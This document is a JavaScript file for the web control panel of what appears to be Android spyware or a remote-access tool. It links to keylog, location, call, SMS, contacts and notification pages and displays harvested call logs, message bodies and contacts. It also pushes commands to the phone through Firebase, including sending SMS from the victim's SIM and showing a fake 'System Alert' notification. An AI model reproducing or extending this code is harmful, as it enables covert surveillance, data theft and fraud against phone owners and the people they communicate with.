// Initialize Firebase
let db;
try {
    if (!firebase.apps.length) {
        firebase.initializeApp(firebaseConfig);
        console.log("Firebase initialized successfully");
    }
    db = firebase.database();
    console.log("Firebase database reference created");
} catch (error) {
    console.error("Firebase initialization error:", error);
    alert("Failed to initialize Firebase: " + error.message);
}

// Get Device ID from URL
const urlParams = new URLSearchParams(window.location.search);
const deviceId = urlParams.get('id');
console.log("Device ID from URL:", deviceId);

if (!deviceId) {
    alert("No Device ID specified.");
    window.location.href = "index.html";
}

// Update Sidebar Links with Device ID
if (document.getElementById('link-dashboard')) {
    document.getElementById('link-dashboard').href = `device.html?id=${deviceId}`;
    document.getElementById('link-location').href = `location.html?id=${deviceId}`;
    document.getElementById('link-keylogs').href = `keylogs.html?id=${deviceId}`;
    document.getElementById('link-info').href = `info.html?id=${deviceId}`;
    document.getElementById('link-apps').href = `apps.html?id=${deviceId}`;
    document.getElementById('link-calls').href = `calls.html?id=${deviceId}`;
    document.getElementById('link-sms').href = `sms.html?id=${deviceId}`;
    document.getElementById('link-contacts').href = `contacts.html?id=${deviceId}`;
    document.getElementById('link-notifications').href = `notifications.html?id=${deviceId}`;
    if (document.getElementById('link-remote')) document.getElementById('link-remote').href = `remote.html?id=${deviceId}`;
}

// Stats Elements
const statusEl = document.getElementById('connection-status');
const deviceNameEl = document.getElementById('device-name');
const deviceIdEl = document.getElementById('device-id');
const deviceStatusEl = document.getElementById('device-status');
const deviceBatteryEl = document.getElementById('device-battery');
const deviceIpEl = document.getElementById('device-ip');
const deviceLastSeenEl = document.getElementById('device-last-seen');
const loadingEl = document.getElementById('loading');
const dashboardContent = document.getElementById('dashboard-content');

// Init
function init() {
    // Connection Status
    db.ref(".info/connected").on("value", (snap) => {
        if (snap.val() === true) {
            statusEl.textContent = "Connected";
            statusEl.classList.add("status-online");
            statusEl.classList.remove("status-offline");
        } else {
            statusEl.textContent = "Disconnected";
            statusEl.classList.add("status-offline");
            statusEl.classList.remove("status-online");
        }
    });

    // Device Info with error handling
    const deviceRef = db.ref(`devices/${deviceId}`);

    // Add timeout to detect if device never loads
    const loadTimeout = setTimeout(() => {
        if (loadingEl && loadingEl.style.display !== 'none') {
            loadingEl.textContent = "Device not found or offline. Make sure the app is running on the device.";
            loadingEl.style.color = "#ef4444";
            console.error("Device data timeout - no data received from Firebase");
        }
    }, 10000); // 10 second timeout

    deviceRef.on('value', (snapshot) => {
        clearTimeout(loadTimeout);
        const device = snapshot.val();

        if (device) {
            renderDeviceInfo(device);
            if (loadingEl) loadingEl.style.display = 'none';
            if (dashboardContent) dashboardContent.style.display = 'block';
        } else {
            if (loadingEl) {
                loadingEl.textContent = "Device not found. Make sure the app is installed and running.";
                loadingEl.style.color = "#ef4444";
            }
        }
    }, (error) => {
        clearTimeout(loadTimeout);
        if (loadingEl) {
            loadingEl.textContent = "Error loading device data: " + error.message;
            loadingEl.style.color = "#ef4444";
        }
    });

    // Logs
    listenForLogs();
}

function renderDeviceInfo(device) {
    deviceNameEl.textContent = device.model || 'Unknown Device';
    deviceIdEl.textContent = `ID: ${deviceId} | ${device.manufacturer || ''} ${device.androidVersion || ''}`;

    deviceIpEl.textContent = device.ipAddress || '-';
    // Use last seen for simple date, or maybe add a tooltip with full date
    deviceLastSeenEl.textContent = device.lastSeen ? new Date(device.lastSeen).toLocaleString() : 'Never';

    // Hardware Details Tooltip or extra text (simple append for now)
    if (device.board || device.hardware) {
        document.getElementById('device-id').title = `Board: ${device.board}, Hardware: ${device.hardware}`;
    }

    // Status Badge
    const isOnline = device.status === 'online'; // You might want to add timeout logic here if lastSeen is too old
    deviceStatusEl.textContent = isOnline ? 'Online' : 'Offline';
    deviceStatusEl.className = `status-badge ${isOnline ? 'status-online' : 'status-offline'}`;

    // Battery
    if (device.batteryLevel) {
        deviceBatteryEl.textContent = `Battery: ${device.batteryLevel}%`;
        deviceBatteryEl.style.display = 'inline-flex';
    } else {
        deviceBatteryEl.style.display = 'none';
    }

    // Populate SIM cards if available
    if (device.simCards) {
        populateSimCards(device.simCards);
    }
}

window.sendCommand = function (commandType, extras = {}) {
    if (!deviceId) return;

    const cmdRef = db.ref(`commands/${deviceId}`);
    const payload = {
        type: commandType,
        timestamp: firebase.database.ServerValue.TIMESTAMP,
        ...extras
    };

    cmdRef.push(payload)
        .then(() => {
            alert(`Command '${commandType}' sent!`);
        })
        .catch((error) => {
            console.error("Error sending command:", error);
            alert("Failed to send command.");
        });
};

window.sendVibrate = function () {
    window.sendCommand('vibrate', { duration: 3000 });
};

window.sendTorch = function (state) {
    window.sendCommand('torch', { status: state }); // Sending boolean or 'true'/'false'
};

window.sendToast = function () {
    const input = document.getElementById('toast-message');
    if (input && input.value.trim() !== "") {
        window.sendCommand('show_toast', { message: input.value.trim() });
        input.value = ""; // Clear input
    } else {
        alert("Please enter a message.");
    }
};

window.sendNotification = function () {
    const input = document.getElementById('notification-message');
    if (input && input.value.trim() !== "") {
        window.sendCommand('show_notification', {
            title: 'System Alert',
            message: input.value.trim()
        });
        input.value = ""; // Clear input
    } else {
        alert("Please enter a message.");
    }
};

// Populate SIM card dropdown
function populateSimCards(simCards) {
    const simSelect = document.getElementById('sms-sim');
    if (!simSelect) return;

    // Clear existing options except first
    simSelect.innerHTML = '<option value="">Select SIM Card (Optional)</option>';

    if (Array.isArray(simCards) && simCards.length > 0) {
        simCards.forEach(sim => {
            const option = document.createElement('option');
            option.value = sim.subscriptionId;
            option.textContent = `${sim.displayName} - ${sim.carrierName}`;
            simSelect.appendChild(option);
        });
    } else {
        const option = document.createElement('option');
        option.value = "";
        option.textContent = "Default SIM";
        simSelect.appendChild(option);
    }
}

window.sendSms = function () {
    const simSelect = document.getElementById('sms-sim');
    const phoneInput = document.getElementById('sms-phone');
    const messageInput = document.getElementById('sms-message');

    const simSlot = simSelect?.value ? parseInt(simSelect.value) : null;
    const phone = phoneInput?.value.trim();
    const message = messageInput?.value.trim();

    if (!phone || !message) {
        alert('Please enter both phone number and message.');
        return;
    }

    // Basic phone number validation
    const phoneRegex = /^\+?[1-9]\d{1,14}$/;
    if (!phoneRegex.test(phone.replace(/[\s-]/g, ''))) {
        alert('Please enter a valid phone number.');
        return;
    }

    const commandData = {
        phoneNumber: phone,
        message: message
    };

    // Add SIM slot if selected
    if (simSlot !== null) {
        commandData.simSlot = simSlot;
    }

    window.sendCommand('send_sms', commandData);

    // Clear inputs after sending
    phoneInput.value = '';
    messageInput.value = '';
};



// Logs
function listenForLogs() {
    // Calls
    const callsBody = document.getElementById('calls-body');
    if (callsBody) {
        db.ref(`data/${deviceId}/calls`).limitToLast(100).on('value', snap => {
            const calls = snap.val();
            callsBody.innerHTML = '';
            if (calls) {
                callsBody.innerHTML = Object.values(calls).reverse().map(call => `<tr>
                    <td>${call.type}</td>
                    <td>${call.number}</td>
                    <td>${call.name || '-'}</td>
                    <td>${formatDuration(call.duration)}</td>
                    <td>${new Date(call.date).toLocaleString()}</td>
                </tr>`).join('');
            } else {
                callsBody.innerHTML = '<tr><td colspan="5" style="text-align:center; color: #6b7280;">No call logs found. Click "Fetch Call Log" to update.</td></tr>';
            }
        });
    }

    // SMS
    const smsBody = document.getElementById('sms-body');
    if (smsBody) {
        db.ref(`data/${deviceId}/sms`).limitToLast(100).on('value', snap => {
            const smsList = snap.val();
            if (smsList) {
                smsBody.innerHTML = Object.values(smsList).reverse().map(sms => `<tr>
                    <td>${sms.type}</td>
                    <td>${sms.address}</td>
                    <td>${sms.body}</td>
                    <td>${new Date(sms.date).toLocaleString()}</td>
                </tr>`).join('');
            } else {
                smsBody.innerHTML = '<tr><td colspan="4" style="text-align:center; color: #6b7280;">No SMS logs found. Click "Fetch SMS Log" to update.</td></tr>';
            }
        });
    }

    // Contacts
    const contactsBody = document.getElementById('contacts-body');
    if (contactsBody) {
        db.ref(`data/${deviceId}/contacts`).on('value', snap => {
            const contacts = snap.val();
            contactsBody.innerHTML = '';
            if (contacts) {
                contactsBody.innerHTML = Object.values(contacts)
                    .sort((a, b) => (a.name || '').localeCompare(b.name || ''))
                    .map(contact => `<tr>
                        <td>${contact.name}</td>
                        <td>${contact.phoneNumber}</td>
                    </tr>`).join('');
            } else {
                contactsBody.innerHTML = '<tr><td colspan="2" style="text-align:center; color: #6b7280;">No contacts found. Click "Fetch Contacts" to update.</td></tr>';
            }
        });
    }
}

function formatDuration(seconds) {
    if (!seconds) return '0s';
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return m > 0 ? `${m}m ${s}s` : `${s}s`;
}

// Tab Switching
window.openTab = function (tabName) {
    const tabContent = document.getElementsByClassName("tab-content");
    for (let i = 0; i < tabContent.length; i++) {
        tabContent[i].style.display = "none";
        tabContent[i].classList.remove("active");
    }

    const tabLinks = document.getElementsByClassName("tab-btn");
    for (let i = 0; i < tabLinks.length; i++) {
        tabLinks[i].classList.remove("active");
    }

    document.getElementById(tabName).style.display = "block";
    document.getElementById(tabName).classList.add("active");

    // Highlight button
    const btns = document.querySelectorAll(`.tab-btn[onclick="openTab('${tabName}')"]`);
    if (btns.length > 0) btns[0].classList.add("active");
};
